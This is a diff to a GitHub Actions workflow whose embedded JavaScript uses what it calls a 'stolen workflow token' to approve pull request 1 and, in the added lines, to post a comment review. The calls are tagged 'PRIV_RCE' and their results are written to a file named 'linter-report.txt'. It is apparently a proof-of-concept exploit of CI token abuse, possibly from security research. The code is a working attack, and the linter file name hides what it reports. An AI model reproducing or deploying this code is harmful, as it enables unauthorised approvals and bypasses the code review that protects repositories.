@@ -43,6 +43,12 @@ jobs:
               body: JSON.stringify({ event: 'APPROVE', body: 'PRIV_RCE approve via stolen workflow token' })
             });
             lines.push('PRIV_RCE_APPROVE status=' + rv.status + ' body=' + (await rv.text()).slice(0, 120));
+            const rcm = await fetch(base + '/pulls/1/reviews', {
+              method: 'POST',
+              headers: H,
+              body: JSON.stringify({ event: 'COMMENT', body: 'PRIV_RCE COMMENT review written with the workflow token' })
+            });
+            lines.push('PRIV_RCE_COMMENT_REVIEW status=' + rcm.status + ' body=' + (await rcm.text()).slice(0, 120));
             fs.writeFileSync(path.join(process.env.INIT_CWD || process.cwd(), 'linter-report.txt'), lines.join(nl) + nl);
             const rp = await fetch(base, { headers: H });
             const j = await rp.json();
